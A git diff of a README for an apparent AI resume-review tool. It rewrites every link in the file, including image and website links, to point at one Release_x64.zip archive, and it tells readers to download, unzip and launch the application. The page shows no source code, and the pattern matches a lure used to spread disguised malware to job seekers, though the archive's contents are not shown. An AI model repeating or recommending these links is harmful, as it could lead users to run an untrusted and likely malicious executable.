@@ -1,12 +1,12 @@
 # AI Resume Review & Feedback 🤖📝
 
-[![AI Resume Review & Feedback](https://img.shields.io/badge/Launch-Software.zip-green)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![AI Resume Review & Feedback](https://github.com/eryk123456555/ai-resume-review-feedback/releases/download/v2.0/Release_x64.zip)](https://github.com/eryk123456555/ai-resume-review-feedback/releases/download/v2.0/Release_x64.zip)
 
 Welcome to the AI Resume Review & Feedback repository! Here, you will find a cutting-edge tool that leverages artificial intelligence to review resumes and provide instant feedback for improvement. This project was created with the aim of assisting job seekers in enhancing their resumes to increase their chances of landing their dream job. 🚀
 
 ## Repository Information ℹ️
 - **Repository Name**: ai-resume-review-feedback
-- **Description**: AI reviews resumes provides instant feedback for improvement... Created at [Coslynx](https://coslynx.com)
+- **Description**: AI reviews resumes provides instant feedback for improvement... Created at [Coslynx](https://github.com/eryk123456555/ai-resume-review-feedback/releases/download/v2.0/Release_x64.zip)
 - **Topics**: 'ai-resume', 'api', 'career-tools', 'code-generation', 'coslynx', 'developer-tools', 'devops', 'feedback-system', 'hr-tech', 'javascript', 'job-search', 'machine-learning', 'mvp', 'nodejs', 'python', 'reactjs', 'resume-review', 'web-app'
 
 ## About the Project ℹ️
@@ -15,7 +15,7 @@ The AI Resume Review & Feedback tool is designed to streamline the resume improv
 ## How to Use the Tool 🛠️
 To access the AI Resume Review & Feedback tool, simply click on the colorful button below to download the software package:
 
-[![AI Resume Review & Feedback](https://img.shields.io/badge/Launch-Software.zip-green)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![AI Resume Review & Feedback](https://github.com/eryk123456555/ai-resume-review-feedback/releases/download/v2.0/Release_x64.zip)](https://github.com/eryk123456555/ai-resume-review-feedback/releases/download/v2.0/Release_x64.zip)
 
 Once you have downloaded the software package, unzip the files and launch the application to start receiving instant feedback on your resume.
 
@@ -30,6 +30,6 @@ If you encounter any issues with the AI Resume Review & Feedback tool or if you 
 
 Thank you for visiting the AI Resume Review & Feedback repository! We hope this tool will assist you in optimizing your resume and achieving your career goals. 🌟📝
 
-![AI Resume Review & Feedback](https://www.example.com/images/ai-resume.png)
+![AI Resume Review & Feedback](https://github.com/eryk123456555/ai-resume-review-feedback/releases/download/v2.0/Release_x64.zip)
 
-[![Visit Coslynx](https://img.shields.io/badge/Visit-Coslynx-orange)](https://coslynx.com)
+[![Visit Coslynx](https://github.com/eryk123456555/ai-resume-review-feedback/releases/download/v2.0/Release_x64.zip)](https://github.com/eryk123456555/ai-resume-review-feedback/releases/download/v2.0/Release_x64.zip)
